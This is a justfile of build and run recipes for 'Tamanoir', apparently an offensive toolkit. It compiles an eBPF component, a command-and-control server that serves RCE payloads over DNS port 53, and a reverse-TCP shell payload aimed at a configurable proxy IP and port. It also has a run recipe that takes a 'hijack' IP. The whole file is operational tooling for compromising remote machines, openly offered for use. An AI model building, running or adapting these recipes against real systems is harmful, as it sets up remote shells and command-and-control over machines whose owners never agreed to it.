set export
_default:
    @just --list


_build-ebpf:
    cd tamanoir-ebpf && cargo build --release


# Build Tamanoir
build-tamanoir:
    just _build-ebpf 
    cargo build -p tamanoir --release

# Build C&C server
build-c2:
    cargo build -p tamanoir-c2 --release

# Run Tamanoir
run proxy_ip hijack_ip="8.8.8.8" layout="1" log_level="info":
    RUST_LOG={{log_level}} sudo -E target/release/tamanoir --proxy-ip {{proxy_ip}} --hijack-ip {{hijack_ip}} --layout {{layout}}

# Run the C&C server
c2 rce="hello" target_arch="x86_64" dns_ip="8.8.8.8" port="53" payload_len="8" log_level="info" :
    RUST_LOG={{log_level}} sudo -E ./target/release/tamanoir-c2  --port {{port}} \
    --dns-ip {{dns_ip}} \
    --payload-len {{payload_len}} \
    --rce {{rce}} \
    --target-arch {{target_arch}}




_build-rce payload="hello":
    cd tamanoir-rce &&  just build {{payload}} && cargo build  --release

_run-rce:
    cd tamanoir-rce && sudo -E target/release/tamanoir-rce

_build_reverse_shell proxy_ip="192.168.1.15" rce_port="8082":
    IP=$(just _atoi {{proxy_ip}}) PORT={{rce_port}} just _build-rce reverse-tcp


_atoi ipv4_address:
	#!/usr/bin/env bash
	IP={{ipv4_address}}; IPNUM=0
	for (( i=0 ; i<4 ; ++i )); do
	((IPNUM+=${IP%%.*}*$((256**$((3-${i}))))))
	IP=${IP#*.}
	done
	echo $IPNUM 

